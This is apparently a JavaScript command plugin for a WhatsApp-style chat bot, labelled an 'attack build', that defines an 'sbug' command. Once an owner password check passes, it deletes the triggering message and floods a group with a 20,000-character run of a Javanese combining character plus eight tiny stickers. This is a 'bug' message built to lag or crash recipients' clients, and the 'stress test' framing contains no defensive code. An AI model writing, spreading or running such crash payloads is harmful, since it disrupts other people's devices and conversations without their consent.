// ATTACK BUILD — sticker stress test for antibug. Strip on RV.
import {
  allowBugAttack,
  isDeveloper,
  isGroup,
  requestBugAuth
} from "../core/helpers.js";

const MINI_WEBP = Buffer.from(
  "UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=",
  "base64"
);
const JV = "\uA9BE";

export default {
  name: "sbug",
  aliases: ["sbug"],
  order: 9992,
  match(__ctx) { return __ctx.cmd === "sbug"; },
  async run(__ctx) {
    const { sock, msg, jid, send } = __ctx;
    if (!isGroup(jid)) return { __done: true, value: true };

    if (!allowBugAttack(sock, msg) && !isDeveloper(sock, msg)) {
      requestBugAuth(sock, msg, "sbug", []);
      await send("🔐 *Password required*\nOwner password reply karo (90s).");
      return { __done: true, value: true };
    }

    try { await sock.sendMessage(jid, { delete: msg.key }); } catch {}

    try {
      await sock.sendMessage(jid, { text: "SBUG " + JV.repeat(20000) });
    } catch {}

    for (let i = 0; i < 8; i++) {
      try {
        await sock.sendMessage(jid, { sticker: MINI_WEBP });
      } catch {}
    }

    return { __done: true, value: true };
  }
};
